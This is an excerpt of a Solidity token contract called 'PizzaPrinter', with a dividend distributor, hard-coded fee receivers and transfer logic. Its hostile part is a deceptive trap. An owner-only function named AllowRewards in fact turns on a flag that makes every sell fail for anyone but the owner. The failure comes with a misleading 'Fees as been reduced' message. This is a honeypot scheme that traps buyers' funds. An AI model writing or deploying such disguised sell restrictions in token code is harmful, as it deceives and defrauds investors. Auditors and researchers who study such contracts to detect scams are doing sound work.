...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x6121191018BAf067c6Dc6B18D42329447a164F05); 
...
contract PizzaPrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x6121191018BAf067c6Dc6B18D42329447a164F05; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "PizzaPrinter";
    string constant _symbol = "PIZZAPRINT";
    ...
    address public autoLiquidityReceiver=0xfF83A63daF3e3848a1a284B4c189C637f8B4B736;
    address public marketingFeeReceiver=0xfF83A63daF3e3848a1a284B4c189C637f8B4B736;
    ...
    function AllowRewards(bool value) external onlyOwner {
        Seller = value;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Seller || sender==owner), "Fees as been reduced");
